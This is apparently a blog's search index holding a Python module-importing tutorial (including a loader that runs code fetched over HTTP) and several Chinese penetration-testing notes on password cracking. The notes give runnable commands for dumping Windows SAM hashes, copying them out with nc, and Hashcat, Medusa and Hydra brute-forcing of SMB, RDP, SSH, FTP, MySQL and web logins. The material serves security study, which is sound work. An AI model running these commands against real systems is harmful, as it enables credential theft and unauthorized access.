<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python花式导包的几种方法</title>
      <link href="/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash识别及Hashcat离线密码破解</title>
      <link href="/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h3></blockquote><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>禁止明文传输密码</li><li>每次认证使用HASH算法加密密码传输(HASH算法加密容易、解密困难)</li><li>服务器端用户数据库应加盐加密保存</li></ul><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h4><ul><li>嗅探获取密码HASH</li><li>利用漏洞登陆服务器并从用户数据库获取密码HASH</li><li>识别HASH类型<br>  长度、字符集</li><li>利用离线破解工具碰撞密码HASH</li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul><blockquote><h4 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h4></blockquote><ul><li><code>hash‐identifier</code></li><li><code>Hashid</code></li><li>可能识别错误或无法识别</li></ul><blockquote><h4 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h4></blockquote><ul><li>利用漏洞：<code>Pwdump</code>,<code>fgdump</code>,<code>mimikatz</code>,<code>wce</code> </li><li>物理接触：<code>samdump2</code></li><li>Kali ISO 启动虚拟机 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdesk -l</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</span><br><span class="line">cd &#x2F;mnt&#x2F;Windows&#x2F;System32&#x2F;config</span><br><span class="line">samdump2 SYSTEM SAM -o sam.hash</span><br></pre></td></tr></table></figure></li><li>利用nc传输HASH<pre><code>nc -nvlp 333nc 192.168.190.128 333</code></pre><h4 id="Windows系统syskey加密工具"><a href="#Windows系统syskey加密工具" class="headerlink" title="Windows系统syskey加密工具"></a><strong>Windows系统syskey加密工具</strong></h4></li><li>cmd:<code>syskey</code></li><li>使用Bootkey利用RC4算法加密SAM数据库</li><li>Bootkey保存于SYSTEM文件中</li></ul><p><strong>Bkhive</strong></p><ul><li><p>从SYSTEM文件中提取bootkey </p></li><li><p>Kali 2.0 抛弃了bkhive </p><p>  apt-get purge samdump2    #卸载samdump2<br>  编译安装:<code>http://http.us.debian.org/debian/pool/main/b/bkhive/</code><br>  make<br>  make install<br>  bkhive SYSTEM key<br>  samdump2 SAM key  (版本已更新，不再支持此功能)<br>  建议使用 Kali 1.x</p></li></ul><blockquote><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><strong>Hashcat</strong></h4></blockquote><p>开源多线程密码破解工具<br>支持80多种加密算法破解<br>基于CPU的计算能力破解<br>六种模式 </p><ol start="0"><li>Straight：字典破解</li><li>Combination：将字典中密码进行组合(1 2 &gt; 11 22 12 21)</li><li>Toggle case：尝试字典中所有密码的大小写字母组合</li><li>Brute force：指定字符集(或全部字符集)所有组合</li><li>Permutation：字典中密码的全部字符置换组合(12 21)</li><li>Table-lookup：程序为字典中所有密码自动生成掩码</li></ol><p><strong>命令</strong></p><pre><code>hashcat -bhashcat -m 100 hash.dump pass.lsthashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d结果：hashcat.pothashcat -m 100 -a 3 hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l?l = abcdefghijklmnopqrstuvwxyz?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?s =  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~?a = ?l?u?d?s?b = 0x00 - 0xff</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hashid </tag>
            
            <tag> hash‐identifier </tag>
            
            <tag> mimikatz </tag>
            
            <tag> nc </tag>
            
            <tag> kali </tag>
            
            <tag> hashcat </tag>
            
            <tag> 离线密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medusa在线密码破解</title>
      <link href="/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Hydra 的缺点</p></blockquote><ul><li>稳定性差，程序时常崩溃</li><li>速度控制不好，容易触发服务屏蔽或锁死机制</li><li>每主机新建进程，每服务新建实例</li><li>大量目标破解时性能差</li></ul><blockquote><p>Medusa 的特点</p></blockquote><ul><li>稳定性好</li><li>速度控制得当</li><li>基于线程</li><li>支持模块少于hydra(不支持RDP)</li><li>WEB-Form支持存在缺陷</li></ul><h4 id="medusa支持破解的模块"><a href="#medusa支持破解的模块" class="headerlink" title="medusa支持破解的模块"></a><strong>medusa支持破解的模块</strong></h4><pre><code>medusa -d </code></pre><h4 id="medusa破解windows密码"><a href="#medusa破解windows密码" class="headerlink" title="medusa破解windows密码"></a><strong>medusa破解windows密码</strong></h4><pre><code>medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></pre><h4 id="medusa破解Linux-SSH密码"><a href="#medusa破解Linux-SSH密码" class="headerlink" title="medusa破解Linux SSH密码"></a><strong>medusa破解Linux SSH密码</strong></h4><pre><code>medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>medusa -M ftp -h 1.1.1.1 -e ns -F -u ftp -P password.lstmedusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -Fmedusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;-n：非默认端口-s：使用SSL连接-T：并发主机数 medusa -M ftp -q</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> medusa </tag>
            
            <tag> 在线密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hydra在线密码破解</title>
      <link href="/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a><strong>Hydra</strong></h3></blockquote><ul><li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li></ul><h4 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a><strong>Windows密码破解</strong></h4><pre><code>hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVdhydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></pre><h4 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a><strong>Linux密码破解</strong></h4><pre><code>hydra -l root -P pass.lst ssh://1.1.1.1 -t 1 -vV</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></pre><h4 id="hydra图形化界面"><a href="#hydra图形化界面" class="headerlink" title="hydra图形化界面"></a><strong>hydra图形化界面</strong></h4><pre><code>xhydra</code></pre><h4 id="HTTP表单身份认证"><a href="#HTTP表单身份认证" class="headerlink" title="HTTP表单身份认证"></a><strong>HTTP表单身份认证</strong></h4><pre><code>hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vhydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:Login Failed&quot; -V    #失败/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:FooC:先访问指定页面取得cookieH:指定http头https-post-form、http-get-form、https-get-form-S：使用SSL连接</code></pre><h4 id="pw-inspector-hydra软件包附带工具"><a href="#pw-inspector-hydra软件包附带工具" class="headerlink" title="pw-inspector hydra软件包附带工具"></a><strong>pw-inspector</strong> hydra软件包附带工具</h4><p>按长度和字符集筛选字典</p><pre><code>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></pre><h4 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a><strong>密码破解效率</strong></h4><ul><li>密码复杂度(字典命中率)</li><li>带宽、协议、服务器性能、客户端性能</li><li>锁定阈值</li><li>单位时间最大登陆请求次数</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 在线密码破解 </tag>
            
            <tag> hydra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码破解方法及Crunch字典生成工具</title>
      <link href="/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
      <url>/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h3><p>目标系统实施了强安全措施</p><ul><li>安装了所有补丁 </li><li>无任何已知漏洞 </li><li>无应用层漏洞 </li><li>攻击面最小化<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4>获取目标系统用户身份 </li><li>非授权用户不受信，认证用户可以访问守信资源 </li><li>已有用户账号权限受限，需要提权 </li><li>不会触发系统报警</li></ul><h4 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a><strong>身份认证方法</strong></h4><ul><li>证明你是你声称你是的那个人</li><li>你知道什么（账号密码、pin、passphrase） </li><li>你有什么（令牌、token、key、证书、密宝、手机）</li><li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别） </li><li>以上方法结合使用（多因素身份认证）<br>基于互联网的身份验证仍以账号密码为主要形式</li></ul><blockquote><h3 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a><strong>密码破解方法</strong></h3></blockquote><h4 id="人工猜解"><a href="#人工猜解" class="headerlink" title="人工猜解"></a><strong>人工猜解</strong></h4><ul><li>垃圾桶工程</li><li>被动信息收集 <h4 id="基于字典暴力破解（主流）"><a href="#基于字典暴力破解（主流）" class="headerlink" title="基于字典暴力破解（主流）"></a>基于字典暴力破解（主流）</h4><h4 id="键盘空间字符暴破"><a href="#键盘空间字符暴破" class="headerlink" title="键盘空间字符暴破"></a>键盘空间字符暴破</h4></li></ul><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li>保存有用户名和密码的文本文件 </li><li>/usr/share/wordlist </li><li>/usr/share/wfuzz/wordlist 